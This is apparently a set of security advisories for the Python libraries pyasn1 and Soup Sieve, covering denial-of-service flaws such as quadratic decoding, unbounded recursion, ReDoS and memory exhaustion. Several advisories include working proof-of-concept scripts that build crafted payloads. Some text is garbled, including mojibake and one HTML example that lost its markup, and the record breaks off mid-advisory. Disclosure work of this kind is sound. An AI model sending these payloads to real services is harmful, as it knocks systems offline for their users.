vulnerabilities.summary: pyasn1: Quadratic complexity in OBJECT IDENTIFIER and RELATIVE-OID processing allows denial of service
vulnerabilities.details:
### Impact
The BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.

The arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.

### Affected components
ObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.

### Patches
Fixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.

### Workarounds
Limit the size of untrusted ASN.1 input before decoding.

vulnerabilities.summary: pyasn1 has quadratic-time denial of service in constructed string and indefinite-length ANY decoding
vulnerabilities.details:
## Summary

In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.

The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.

This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.

## Technical details

In the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).

The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.

The [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.

The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.

The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.

## Impact

If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.

## Severity assessment (CVSS v3.1)

The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).

On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.

| Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU |
| --- | ---: | ---: | ---: |
| BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s |
| BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s |
| BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s |
| BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s |
| BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s |
| BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s |
| CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s |
| CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s |
| CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |

For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.

## Reproduction

This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.

```python
import time

from pyasn1.codec.ber import decoder as ber
from pyasn1.codec.cer import decoder as cer
from pyasn1.codec.der import decoder as der
from pyasn1.type import univ


def tlv(identifier, contents):
    length = len(contents)
    if length < 128:
        return bytes((identifier, length)) + contents
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes((identifier, 0x80 | len(encoded))) + encoded + contents


def measure(label, decode, substrate, asn1Spec=None):
    start = time.process_time()
    _, rest = decode(substrate, asn1Spec=asn1Spec)
    assert not rest
    print(f"{label}: {len(substrate)} input bytes, "
          f"{time.process_time() - start:.3f} CPU seconds")


n = 100_000
octet_fragments = b"\x04\x02AA" * n
utf8_fragments = b"\x0c\x02AA" * n

measure("BER constructed OCTET STRING", ber.decode,
        tlv(0x24, octet_fragments))
measure("BER indefinite ANY", ber.decode,
        b"\x30\x80" + b"\x04\x01A" * n + b"\x00\x00",
        univ.Any())

# CER uses indefinite length and 1,000-content-octet primitive fragments.
cer_fragment = tlv(0x04, b"A" * 1000)
measure("CER constructed OCTET STRING", cer.decode,
        b"\x24\x80" + cer_fragment * 1000 + b"\x00\x00")

# These constructed encodings are accepted by pyasn1 but are invalid DER.
measure("DER OCTET STRING with schema", der.decode,
        tlv(0x24, octet_fragments), univ.OctetString())
measure("DER UTF8String without schema", der.decode,
        tlv(0x2c, utf8_fragments))
```

## Patch

pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.

## Workaround

Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.

## Credits and references

Reported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.

- [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py)
- [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en)
- [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)

vulnerabilities.summary: pyasn1 has quadratic CPU use in schemaless BER/CER/DER container decoding
vulnerabilities.details:
### Summary

When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.

### Details

ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.

### Proof of concept

Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:

```python
import sys
import time

from pyasn1.codec.ber import decoder
from pyasn1.type import univ


def enc_tag(tag_id):
    groups = [tag_id & 0x7f]
    tag_id >>= 7
    while tag_id:
        groups.append((tag_id & 0x7f) | 0x80)
        tag_id >>= 7
    return b'\xbf' + bytes(reversed(groups))


def payload(tag_ids):
    body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'
                    for tag_id in tag_ids)
    length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')
    return b'\x30' + bytes([0x80 | len(length)]) + length + body


for count in (3200, 6400):
    cases = (
        ("collision", [32 + i * sys.hash_info.modulus
                       for i in range(count)]),
        ("control", [(1 << 70) + i for i in range(count)]),
    )
    for name, tag_ids in cases:
        wire = payload(tag_ids)
        start = time.process_time()
        value, remainder = decoder.decode(wire)
        cpu_seconds = time.process_time() - start

        assert type(value) is univ.Sequence
        assert len(value) == count and remainder == b''
        for position, tag_id in enumerate(tag_ids):
            component = value.getComponentByPosition(position)
            assert component.asOctets() == b'A'
            assert component.tagSet[-1].tagId == tag_id

        print(count, name, len(wire), round(cpu_seconds, 3))
```

### Impact

Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

vulnerabilities.summary: pyasn1: Uncontrolled resource consumption when converting decoded REAL values
vulnerabilities.details:
### Impact
The univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.

Any operation that triggers float conversion on such a decoded value — prettyPrint(), str(), comparison, arithmetic, or an explicit float() call — consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.

### Affected components
- pyasn1.type.univ.Real — float conversion (__float__() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int())
- Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values

The encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.

### Patches
Fixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as <overflow>.

### Workarounds
Avoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead.

vulnerabilities.summary: Denial of Service in pyasn1 via Unbounded Recursion
vulnerabilities.details:
### Summary
The `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.

### Details
The vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth.
Vulnerable Code Locations:
1. `indefLenValueDecoder` (Line 998):
```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):```
This method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.

2. `valueDecoder` (Lines 786 and 907):
```for component in decodeFun(substrate, componentType, **options):```
This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.

4. `_decodeComponentsSchemaless` (Line 661):
```for component in decodeFun(substrate, **options):```
This method handles decoding when no schema is provided.

In all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.

### PoC
```
import sys
from pyasn1.codec.ber import decoder

sys.setrecursionlimit(100000)

print("[*] Generating Recursion Bomb Payload...")
depth = 50_000
chunk = b'\x30\x80' 
payload = chunk * depth

print(f"[*] Payload size: {len(payload) / 1024:.2f} KB")
print("[*] Triggering Decoder...")

try:
    decoder.decode(payload)
except RecursionError:
    print("[!] Crashed: Recursion Limit Hit")
except MemoryError:
    print("[!] Crashed: Out of Memory")
except Exception as e:
    print(f"[!] Crashed: {e}")
```

```
[*] Payload size: 9.77 KB
[*] Triggering Decoder...
[!] Crashed: Recursion Limit Hit
```

### Impact
- This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion.
- Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.
- Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.

### Credits
Vulnerability discovered by Kevin Tu of TMIR at ByteDance.

vulnerabilities.summary: pyasn1 BER/CER/DER decoder denial of service via unbounded long-form tag IDs
vulnerabilities.details:
### Impact
The BER decoder (shared by the CER and DER codecs) parses long-form tags by accumulating continuation octets in a loop with no upper bound on the size of the tag ID. A crafted input can force the decoder to build an arbitrarily large integer, with CPU cost growing quadratically in input size — a ~1 MB input consumes over a minute of CPU. On Python 3.11+, the oversized tag ID can also trigger an unhandled `ValueError` (integer string conversion limit) while the decoder formats error messages, violating the documented `PyAsn1Error` contract and potentially bypassing caller error handling.

Any application decoding untrusted BER/CER/DER input is affected.

### Affected components
- `pyasn1.codec.ber.decoder` — `decode()` and `StreamingDecoder`
- `pyasn1.codec.cer.decoder` and `pyasn1.codec.der.decoder`, which inherit
  the same tag parsing
- `pyasn1.type.tag` — `Tag`/`TagSet` reprs could raise `ValueError` when
  rendering oversized tag IDs (reachable through decoder error paths)

The encoders and the `pyasn1.codec.native` codec are not affected.

### Patches
Fixed in 0.6.4. Long-form tag IDs are now limited to 20 octets (140-bit tag IDs, matching the existing OID arc limit); oversized tags are rejected with `PyAsn1Error`. Tag ID rendering in reprs and error messages was additionally hardened against the interpreter's integer-to-string conversion limit.

### Workarounds
Bound the size of untrusted input passed to `decode()` before calling it.

vulnerabilities.summary: pyasn1 has quadratic-complexity denial of service in binary REAL decoding
vulnerabilities.details:
## Summary

In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.

This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.

## Root cause and affected components

For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:

```python
p = 0
while chunk:
    p <<= 8
    p |= chunk[0]
    chunk = chunk[1:]
```

Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.

The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.

## Impact

A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.

## Reproduction and evidence

The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.

```python
import time

from pyasn1.codec.ber import decoder as ber
from pyasn1.codec.cer import decoder as cer
from pyasn1.codec.der import decoder as der


def real_value(mantissa_octets):
    content = b"\x80\x00" + b"\xff" * mantissa_octets
    length = len(content).to_bytes(3, "big")
    return b"\x09\x83" + length + content


for codec in (ber, cer, der):
    for size in (50_000, 100_000, 200_000):
        substrate = real_value(size)
        started = time.process_time()
        value, rest = codec.decode(substrate)
        print(codec.__name__, size, time.process_time() - started)
        assert not rest
        assert tuple(value)[1:] == (2, 0)
```

The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.

| Mantissa size | Reporter's BER CPU time |
| ---: | ---: |
| 50,000 octets | 0.328 s |
| 100,000 octets | 1.299 s |
| 200,000 octets | 6.043 s |
| 400,000 octets | 24.095 s |

The same report measured 5.645 s for a 200,000-octet mantissa through DER.

A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.

## Fix

pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.

## Workarounds

Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

Our policy for security related issues is to fix related issues within our power on the most recent major release.

## Versioning

Versioning follows [PEP440](https://peps.python.org/pep-0440/): `major.minior.patch`.

Versions | Description
-------- | -----------
Major    | This reserved for releases that introduce breaking features.
Minor    | This reserved for releases that introduce new functionality.
Patch    | This is reserved for releases that only include bug fixes.

Example

```
8.0
8.1
8.1.3
```

## Create Security Vulnerability Report

If you have found a security vulnerability, you can create a draft "security advisory" on the GitHub repository,
[instructions here](https://docs.github.com/en/code-security/security-advisories/repository-security-advisories/creating-a-repository-security-advisory).
Such advisories are kept private as the issue is explored.

## Security Vulnerability Workflow

We will strive to acknowledge the report in about two business days.

Reports will be kept private until the issue is properly understood.

If the report is accepted we will notify Tidelift (who we've partnered with), request a CVE from GitHub, and work with
the reporter to find a resolution. Work will be done privately, until resolved.

The fix, announcement, and release will be negotiated with the reporter.

Afterwards, a release will be made and the vulnerability will be made public as close to each other as possible.

vulnerabilities.summary: Soup Sieve has Memory Exhaustion via Large Comma-Separated Selector Lists
vulnerabilities.details:
### Summary

The CSS selector parser in soupsieve (the CSS selector engine for Beautiful Soup 4) allocates unbounded memory when compiling large comma-separated selector lists. An attacker who can supply a crafted CSS selector string to `soupsieve.compile()` or Beautiful Soup's `.select()` / `.select_one()` can cause the application to allocate hundreds of megabytes of heap memory from a relatively small input, leading to memory exhaustion and denial of service.

To be completely transparent, AI tools helped surface this issue. However, it was independently reproduced and carefully validated. Researchers follow responsible disclosure practices and originally shared this report privately.

A **500 KB** selector string triggers allocation of approximately **244 MB** of heap memory - a 488x— amplification ratio**.

### Details

**Affected code:** `soupsieve/css_parser.py`, lines ~204, 925, 1106

The soupsieve CSS parser splits comma-separated selector lists and creates one `CSSSelector` object per list item. Each `CSSSelector` object contains parsed selector data structures including `SelectorList`, `Selector`, and associated tag/attribute/pseudo-class metadata.

When a selector string such as `a,a,a,...` (with 250,000 comma-separated items) is passed to `sv.compile()`, the parser:

1. Tokenises the entire string and identifies each comma-delimited segment (line ~1106)
2. Parses each segment into a full `Selector` object with all associated metadata (line ~925)
3. Stores all parsed selectors in a `SelectorList` (line ~204)

**Root cause:** No limit is enforced on the number of selectors in a comma-separated list. The parser will attempt to parse and store an arbitrary number of selectors, with each selector object consuming approximately **976 bytes** of heap memory. The total allocation scales linearly with the number of list items, but the amplification ratio (output memory / input bytes) is extremely high because each single-character selector like `a` expands into a complex object graph.

**Attack surface:** Any application that passes user-supplied CSS selectors to `soupsieve.compile()` or Beautiful Soup's `.select()` / `.select_one()`.

### Proof of Concept

```python
import tracemalloc
import soupsieve as sv

tracemalloc.start()

# Build a 500 KB selector string: "a,a,a,...,a" (250,000 items)
count = 250_000
selector = ",".join("a" for _ in range(count))
print(f"Selector string size: {len(selector):,} bytes ({len(selector) / 1024:.0f} KB)")

# Compile the selector â€” this allocates ~244 MB
compiled = sv.compile(selector)

current, peak = tracemalloc.get_traced_memory()
tracemalloc.stop()

print(f"Compiled selector count: {len(compiled.selectors):,}")
print(f"Current memory: {current / 1024 / 1024:.1f} MB")
print(f"Peak memory: {peak / 1024 / 1024:.1f} MB")
print(f"Amplification ratio: {peak / len(selector):.0f}x")

# Expected output:
# Selector string size: 499,999 bytes (488 KB)
# Compiled selector count: 250,000
# Current memory: ~244 MB
# Peak memory: ~244 MB
# Amplification ratio: ~488x
```

### Impact

**Severity: High**

An attacker can exhaust available memory on any server-side Python application that compiles user-supplied CSS selectors via soupsieve. This can cause:

- **OOM kills** in containerised deployments (Kubernetes pods, Docker containers) with memory limits
- **Swap thrashing** on bare-metal servers, degrading performance for all co-located processes
- **Process termination** via Python's `MemoryError` exception if the system runs out of addressable memory

| Parameter | Value |
|---|---|
| Input size | ~500 KB selector string |
| Memory allocated | ~244 MB |
| Amplification ratio | ~488Ã— |
| Per-object overhead | ~976 bytes per selector |
| Authentication required | None |
| User interaction required | None |

**Scalability of attack:** The memory allocation scales linearly - doubling the selector count doubles memory usage. An attacker can tune the payload to exactly exhaust a target's memory limits. Multiple concurrent requests multiply the effect.

**Downstream exposure:** soupsieve is an automatic dependency of `beautifulsoup4`, one of the most widely installed Python packages. Any web application accepting CSS selectors from users (e.g., web scraping APIs, content filtering tools, CMS preview features) is potentially affected.

---
### Credit

Discovered by a security research team from the University of Sydney, focused on detecting open source software vulnerabilities.
Liyi Zhou: https://lzhou1110.github.io/
Ziyue Wang: https://zyy0530.github.io/
Strick: https://str1ckl4nd.github.io/
Maurice: https://maurice.busystar.org/
Chenchen Yu: https://7thparkk.github.io/

vulnerabilities.summary: Soup Sieve: General sibling combinator inside :has() matches untrusted HTML in quadratic time
vulnerabilities.details:
## Summary Matching a selector that puts a general-sibling combinator inside `:has()`, such as `div:has(a ~ b)`, against untrusted HTML runs in O(n²) time in the number of sibling elements. A single small document with a few thousand siblings ties the process up for a minute of CPU, so an application that runs a fixed selector of this shape over HTML it doesn't control can be stalled by one request. `:has` is powerful, but much in the same way poor regular expressions can be crafted to cause catastrophic backtracking with greedy capturing, has can be used to create non-ideal scenarios that can cause large portions of the tree to be evaluated for one or many elements if not used thoughtfully. This behavior is not exclusive to Soup Sieve, but browsers make note of these potential performance issues themselves: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Selectors/:has#performance_considerations. With all of that said, there is room for improvements that can in some cases greatly improve performance. ## Details `:has(a ~ b)` asks "does this element contain an `a` that has a later sibling `b`?". When no `b` is present, soupsieve can't short-circuit, and it answers the question with a nested scan: `match_future_child` walks every candidate `a` under the scope, and for each one the general-sibling branch of `match_future_relations` walks all of that `a`'s following siblings looking for `b`. With n siblings that is (n-1) + (n-2) + ... + 1 comparisons, i.e. O(n²). The adjacent-sibling form `div:has(a + b)` stays linear, because its branch checks only the one immediately following sibling per candidate. So the cost is specific to the general-sibling `~` (and `~` nested inside `:has`), and it shows up on the common case where the right-hand side simply isn't there. ## Proof of concept Installed from PyPI: `pip install soupsieve==2.9.2 beautifulsoup4`. ```python import time import soupsieve from bs4 import BeautifulSoup selector = "div:has(a ~ b)" for n in (1000, 2000, 4000, 8000): html = "
" + ("" * n) + "
" soup = BeautifulSoup(html, "html.parser") start = time.perf_counter() soupsieve.select(selector, soup) print(n, round((time.perf_counter() - start) * 1000), "ms") ``` Measured: ``` n=1000 837 ms n=2000 3667 ms n=4000 14797 ms n=8000 59746 ms ``` Time quadruples for each doubling of n. The n=8000 input is a ~56 KB HTML fragment. ## Impact Availability. Any caller that evaluates a fixed selector containing a general sibling under `:has()` over attacker-controlled markup can be forced to spend minutes of CPU on a small input. The selector is developer-authored and ordinary; the untrusted part is the HTML, which is soupsieve's normal input. A single-pass evaluation of the sibling run (remember whether an `a` has been seen while scanning the siblings once) would make this case linear. ## Mitigation Quadratic time for `:has` in some circumstances is expected and not a bug. While we've made optimizations and there may be more in the future, the way `:has` is designed to operate will never perform in linear time in all circumstances. Users should thoughtfully apply the use of `:has`. The anchor selector (the `A` in `A:has(B)`) should not be an element that has too many children. Additionally, too general an anchor, such as `*`, can cause `:has()` to be applied to every element. Further, it is recommended that the inner selector (the `B` in `A:has(B)`) should use combinators like `>` or `+` to limit traversal. When the selector inside `:has()` is not tightly constrained, Soup Sieve might need to traverse the entire subtree of the anchor element to check the condition. If the risk for a given project is too great, user input can be scanned for usage of `:has` and be denied. Calls can also be wrapped in a timeout to prevent long-running processes as well.

vulnerabilities.summary: Soup Sieve: Exponential ReDoS in selector compilation via \9-run in CSS_ESCAPES/IDENTIFIER
vulnerabilities.details:
### Summary
The IDENTIFIER/CSS_ESCAPES regex (css_parser.py:119-124) exhibits exponential backtracking on a run of ambiguous digit-escapes (`\9`) in an attribute-name or tag position of an otherwise well-formed selector. It fires at compile time (before the SELECTOR_LIMIT guard) via the public `soupsieve.compile()` and BeautifulSoup `.select()`.

### PoC (verified on soupsieve 2.9.2)

    import soupsieve as sv
    sv.compile('[a' + '\\9'*26 + '=x]')   # ~57 bytes -> ~10s; ~16x time per +4 chars

### Novelty
Distinct from the patched GHSA-836r-... (VALUE regex) and GHSA-2wc2-... (comma-list) advisories, which are fixed in 2.9.2; this is a different regex/vector.

### Reachability
CSS selectors are usually developer-controlled, so exposure requires an application that compiles UNTRUSTED selector strings (web-scraping-as-a-service, no-code/query builders, user-defined extraction rules). Where selectors are user-supplied, a ~60-byte string hangs the worker.

### Note
This issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.

vulnerabilities.summary: Soup Sieve: Uncontrolled recursion in CSS parser lets nested pseudo-class selectors exhaust the Python call stack
vulnerabilities.details:
## Summary

The Soup Sieve CSS selector parser recurses once per level of nested pseudo-class selector (`:is()`, `:not()`, `:where()`, `:has()`) without any limit on nesting depth. An unauthenticated attacker who can supply a CSS selector string to `soupsieve.compile()`, `soupsieve.select()`, or Beautiful Soup's `soup.select()` / `soup.select_one()` can force the parser to exceed Python's recursion limit with a small crafted input (about 1.6 KB, roughly 330 nesting levels), raising an uncontrolled `RecursionError`. Because this exception is not part of the parser's documented error contract, applications that catch only `ValueError` or `SelectorSyntaxError` see an unexpected failure of the request or task that parsed the selector.

## Root Cause

